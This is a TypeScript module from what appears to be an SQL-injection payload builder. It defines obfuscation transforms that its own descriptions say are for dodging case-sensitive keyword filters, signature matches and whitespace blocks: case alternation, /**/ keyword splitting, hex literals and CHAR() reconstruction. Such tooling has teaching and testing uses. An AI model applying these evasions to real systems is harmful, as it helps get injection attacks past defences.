import { SqlDialect } from "./dialects";
import { SqliLevel } from "./techniques";

export type SqliObfuscationId =
  | "none"
  | "case-alternation"
  | "inline-comment-split"
  | "whitespace-to-comment"
  | "hex-literal-strings"
  | "char-code-strings";

export type SqliObfuscation = {
  id: SqliObfuscationId;
  label: string;
  description: string;
  level: SqliLevel;
  /** Returns null when this transform doesn't apply on `dialect` (e.g. hex-literal-strings on
   *  every dialect except MySQL) — same graceful-fallback contract as lib/xss/obfuscation.ts's apply. */
  apply: (expr: string, dialect: SqlDialect, quote: string) => string | null;
};

function alternateCase(expr: string): string {
  let out = "";
  let upper = false;
  for (const ch of expr) {
    if (/[a-zA-Z]/.test(ch)) {
      out += upper ? ch.toUpperCase() : ch.toLowerCase();
      upper = !upper;
    } else {
      out += ch;
    }
  }
  return out;
}

function splitKeywordsWithComments(expr: string): string {
  return expr.replace(/[A-Za-z_]{4,}/g, (word) => {
    const mid = Math.max(1, Math.floor(word.length / 2));
    return `${word.slice(0, mid)}/**/${word.slice(mid)}`;
  });
}

function replaceStringLiterals(expr: string, replace: (text: string) => string): string {
  return expr.replace(/'([^']*)'/g, (_match, text: string) => replace(text));
}

export const SQLI_OBFUSCATIONS: SqliObfuscation[] = [
  {
    id: "none",
    label: "None",
    description: "The extraction expression is embedded as-is, with no additional encoding.",
    level: "basic",
    apply: (expr) => expr,
  },
  {
    id: "case-alternation",
    label: "Case alternation",
    description: "Alternates upper/lowercase on every letter (e.g. SeLeCt) to dodge case-sensitive keyword filters.",
    level: "intermediate",
    apply: (expr) => alternateCase(expr),
  },
  {
    id: "inline-comment-split",
    label: "Inline-comment keyword splitting",
    description: "Splits keywords/identifiers in half with an inline comment (e.g. CON/**/CAT) to dodge plain signature matches.",
    level: "intermediate",
    apply: (expr) => splitKeywordsWithComments(expr),
  },
  {
    id: "whitespace-to-comment",
    label: "Whitespace-to-comment",
    description: "Replaces literal spaces with /**/ to dodge filters that block whitespace.",
    level: "intermediate",
    apply: (expr) => expr.replaceAll(" ", "/**/"),
  },
  {
    id: "hex-literal-strings",
    label: "Hex-literal string encoding",
    description:
      "Rewrites quoted string literals as bare hex literals (e.g. 'a' -> 0x61). Only MySQL treats a bare hex literal as a string this way — every other dialect either rejects it or stringifies it as literal hex text instead, so this is unavailable elsewhere.",
    level: "advanced",
    apply: (expr, dialect) => {
      if (dialect.hexStringLiteral === null) return null;
      return replaceStringLiterals(expr, dialect.hexStringLiteral);
    },
  },
  {
    id: "char-code-strings",
    label: "Character-code reconstruction",
    description: "Rewrites quoted string literals as a CHAR()/CHR() call reconstructing them from character codes, avoiding quote characters entirely.",
    level: "advanced",
    apply: (expr, dialect) => replaceStringLiterals(expr, dialect.charFunctionLiteral),
  },
];

export const SQLI_OBFUSCATIONS_BY_ID: Record<SqliObfuscationId, SqliObfuscation> = Object.fromEntries(
  SQLI_OBFUSCATIONS.map((o) => [o.id, o]),
) as Record<SqliObfuscationId, SqliObfuscation>;

export const NONE_SQLI_OBFUSCATION = SQLI_OBFUSCATIONS_BY_ID.none;
